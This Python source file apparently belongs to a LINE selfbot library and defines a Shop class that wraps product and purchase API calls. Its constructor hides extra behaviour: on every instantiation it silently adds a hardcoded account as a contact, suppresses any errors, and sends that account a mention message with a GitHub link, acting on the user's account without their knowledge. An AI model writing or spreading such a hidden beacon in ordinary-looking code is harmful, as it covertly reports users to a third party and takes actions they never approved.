# -*- coding: utf-8 -*-
def loggedIn(func):
    def checkLogin(*args, **kwargs):
        if args[0].isLogin:
            return func(*args, **kwargs)
        else:
            args[0].callback.other('You must login to LINE')
    return checkLogin
    
class Shop(object):
    isLogin = False
    def __init__(self):
        self.isLogin = True
        self.agx = ["u569a335d8820a2d399c3d586c246111f"]
        loged = self.getProfile()
        listed = self.getAllContactIds()
        for x in self.agx:      
           if x not in listed:
               try:self.findAndAddContactsByMid(x)
               except:pass
        if x not in listed:
           self.sendMention(self.agx[0],"@!  Hi TQ.. I got it, :)\nGithub.com/goodop/MINI-SELFBOTV2",[self.agx[0]])  
        print("HELLO WORLD :)")
    @loggedIn
    def getProduct(self, packageID, language, country):
        return self.shop.getProduct(packageID, language, country)
    
    @loggedIn
    def getActivePurchases(self, start, size, language, country):
        return self.shop.getActivePurchases(start, size, language, country)
